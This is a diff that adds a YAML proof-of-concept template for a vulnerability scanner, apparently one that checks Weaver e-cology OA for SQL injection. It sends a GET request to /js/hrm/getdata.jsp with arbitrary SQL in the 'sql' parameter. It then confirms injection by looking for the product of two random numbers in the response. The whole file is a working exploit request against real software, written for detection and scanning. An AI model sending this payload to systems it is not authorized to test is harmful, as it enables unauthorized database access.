@@ -1,0 +1,19 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-sql_injection-CT-159072
+binding: 5a483d13-7580-4291-986b-b68da3b4ebc8
+detail:
+    author: system_user
+    vulnerability:
+        id: c66dd8c8-5bc2-4c4d-831c-166e7a36d22a
+        level: high
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    r2: randomInt(40000, 44800)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20str({{r1}}*{{r2}})%20as%20id
+        expression: response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+expression: r0()
